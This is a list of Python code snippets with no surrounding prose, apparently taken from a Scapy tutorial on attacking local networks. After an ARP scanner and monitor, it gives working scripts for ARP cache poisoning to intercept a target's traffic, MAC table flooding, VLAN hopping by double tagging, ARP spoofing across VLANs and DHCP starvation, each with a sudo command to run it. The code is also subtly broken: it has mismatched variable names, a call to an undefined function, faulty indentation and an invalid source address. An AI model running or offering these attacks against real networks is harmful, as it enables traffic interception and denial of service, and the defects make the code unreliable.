["```py\nfrom scapy.all import *\n```", "```py\ninterface = \"en0\"\nip_rage = \"192.168.1.1/24\"\nbroadcastMac = \"ff:ff:ff:ff:ff:ff\"  \n```", "```py\npkt = Ether(dst=broadcastMac)/ARP(pdst = ip_rage)  \n```", "```py\nanswered, unanswered = srp(pkt, timeout =2, iface=interface, inter=0.1)  \n```", "```py\nfor send,recive in ans:\nprint (recive.sprintf(r\"%Ether.src% - %ARP.psrc%\")) \n```", "```py\nsudo python3 arp-scanner.py \n```", "```py\ndef parsePacket(pkt):\n    if ARP in pkt and pkt[ARP].op in (1,2): \n        return pkt.sprintf(\"%ARP.hwsrc% %ARP.psrc%\") \n```", "```py\nsniff(prn=parsePacket, filter=\"arp\", store=0)  \n```", "```py\nsudo python3 arp-monitor.py  \n```", "```py\ncat /proc/sys/net/ipv4/ip_forward  \n```", "```py\necho 1 > /proc/sys/net/ipv4/ip_forward  \n```", "```py\nsudo sysctl -w net.inet.ip.forwarding=1  \n```", "```py\nsudo sysctl -w net.inet.ip.forwarding=0  \n```", "```py\nfrom scapy.all import *  \n```", "```py\ninterface = \"en0\"\ngateway_ip = \"192.168.1.2\"\ntarget_ip = \"192.168.1.103\"\nbroadcastMac = \"ff:ff:ff:ff:ff:ff\"\npacket_count = 50  \n```", "```py\ndef getMac(IP):\n    ans, unans = srp(Ether(dst=broadcastMac)/ARP(pdst = IP), timeout =2, iface=interface, inter=0.1)\n    for send,recive in ans: \n        return r[Ether].src\n    return None  \n```", "```py\ntry:\n    gateway_mac = getMac(gateway_ip)\n    print (\"Gateway MAC :\" + gateway_mac)\nexcept:\n    print (\"Failed to get gateway MAC. Exiting.\")\n    sys.exit(0)\ntry:\n    target_mac = getMac(target_ip)\n    print (\"Target MAC :\" + target_mac)\nexcept:\n    print (\"Failed to get target MAC. Exiting.\")\n    sys.exit(0)  \n```", "```py\ndef poison(gateway_ip,gateway_mac,target_ip,target_mac):\n    targetPacket = ARP()\n    targetPacket.op = 2\n    targetPacket.psrc = gateway_ip\n    targetPacket.pdst = target_ip\n    targetPacket.hwdst= target_mac\n    gatewayPacket = ARP()\n    gatewayPacket.op = 2\n    gatewayPacket.psrc = target_ip\n    gatewayPacket.pdst = gateway_ip\n    gatewayPacket.hwdst= gateway_mac\n    while True:\n       try:\n           targetPacket.show()\n           send(targetPacket)\n           gatewayPacket.show()\n           send(gatewayPacket)\n           time.sleep(2)\n         except KeyboardInterrupt:                \n restore_target(gateway_ip,gateway_mac,target_ip,target_mac)\n            sys.exit(0)\n       sys.exit(0)\n       return\n```", "```py\ndef restore(gateway_ip,gateway_mac,target_ip,target_mac):\n    print(\"Restoring target...\")\n    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip,hwdst=\"ff:ff:ff:ff:ff:ff\",hwsrc=gateway_mac),count=100)\n    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip,hwdst=\"ff:ff:ff:ff:ff:ff\",hwsrc=target_mac),count=100)\n    print(\"[Target Restored...\")\n    sys.exit(0)\n```", "```py\ntry:\n    poison(gateway_ip, gateway_mac,target_ip,target_mac)\nexcept KeyboardInterrupt:\n    restore(gateway_ip,gateway_mac,target_ip,target_mac)\n    sys.exit(0)  \n```", "```py\nsudo python3 arp-cache-poisoning.py  \n```", "```py\nimport sys\nfrom scapy.all import *  \n```", "```py\ninterface = \"en0\"  \n```", "```py\npkt = Ether(src=RandMAC(\"*:*:*:*:*:*\"), dst=RandMAC(\"*:*:*:*:*:*\")) / \\\n        IP(src=RandIP(\"*.*.*.*\"), dst=RandIP(\"*.*.*.*\")) / \\\n        ICMP()\n\n```", "```py\ntry:\n    while True:\n       sendp(pkt, iface=interface)\nexcept KeyboardInterrupt:\n   print(\"Exiting.. \")\n   sys.exit(0)  \n```", "```py\nsudo python3 mac-flooder.py  \n```", "```py\nimport time\nfrom scapy.all import *\niface = \"en0\"\nour_vlan = 1\ntarget_vlan = 2\ntarget_ip = '192.168.1.2'  \n```", "```py\nether = Ether()\ndot1q1 = Dot1Q(vlan=our_vlan)   # vlan tag 1 \ndot1q2 = Dot1Q(vlan=target_vlan) # vlan tag 2\nip = IP(dst=target_ip)\nicmp = ICMP()\npacket = ether/dot1q1/dot1q2/ip/icmp  \n```", "```py\ntry:\n    while True:\n        sendp(packet, iface=iface)\n        time.sleep(10)\n  except KeyboardInterrupt:\n     print(\"Exiting.. \")\n     sys.exit(0)  \n```", "```py\nsudo python3 vlan-hopping.py  \n```", "```py\nimport time\nfrom scapy.all import *\niface = \"en0\"\ntarget_ip = '192.168.1.2'\nfake_ip = '192.168.1.3'\nfake_mac = 'c0:d3:de:ad:be:ef'\nour_vlan = 1\ntarget_vlan = 2  \n```", "```py\nether = Ether()\ndot1q1 = Dot1Q(vlan=our_vlan)\ndot1q2 = Dot1Q(vlan=target_vlan)\narp = ARP(hwsrc=fake_mac, pdst=target_ip, psrc=fake_ip, op=\"is-at\")\npacket = ether/dot1q1/dot1q2/arp  \n```", "```py\ntry:\n    while True:\n       sendp(packet, iface=iface)\n         time.sleep(10)\n  except KeyboardInterrupt:\n      print(\"Exiting.. \")\n      sys.exit(0)  \n```", "```py\nsudo python3 arp-spoofing-over-vlan.py  \n```", "```py\nfrom scapy.all import *\nfrom time import sleep\nfrom threading import Thread \n```", "```py\nmac = [\"\"]\nip = []  \n```", "```py\ndef callback_dhcp_handle(pkt):\n    if pkt.haslayer(DHCP):\n       if pkt[DHCP].options[0][1]==5 and pkt[IP].dst != \"192.168.1.38\":\n          ip.append(pkt[IP].dst)\n             print (str(pkt[IP].dst)+\" registered\")\n          elif pkt[DHCP].options[0][1]==6:\n              print (\"NAK received\")  \n```", "```py\ndef sniff_udp_packets():\n    sniff(filter=\"udp and (port 67 or port 68)\",\n          prn=callback_dhcp_handle,\n          store=0)  \n```", "```py\ndef occupy_IP():\n    for i in range(250):\n        requested_addr = \"192.168.1.\"+str(2+i)\n        if requested_addr in ip:\n             continue\n          src_mac = \"\"\n          while src_mac in mac:\n              src_mac = RandMAC()\n         mac.append(src_mac)    \n          pkt = Ether(src=src_mac, dst=\"ff:ff:ff:ff:ff:ff\")\n          pkt /= IP(src=\"img/0.0.0.0\", dst=\"255.255.255.255\")\n          pkt /= UDP(sport=68, dport=67)\n          pkt /= BOOTP(chaddr=\"\\x00\\x00\\x00\\x00\\x00\\x00\",xid=0x10000000)\n          pkt /= DHCP(options=[(\"message-type\", \"request\"),\n                               (\"requested_addr\", requested_addr),\n                              (\"server_id\", \"192.168.1.1\"),\n                               \"end\"])\n          sendp(pkt)\n          print (\"Trying to occupy \"+requested_addr)\n          sleep(0.2)  # interval to avoid congestion and packet loss \n```", "```py\ndef main():\n    thread = Thread(target=sniff_udp_packets)\n    thread.start()\n    print (\"Starting DHCP starvation...\")\n   while len(ip) < 100: \n    occupy_IP()\n    print (\"Targeted IP address starved\")   \n  main()\n\n```"]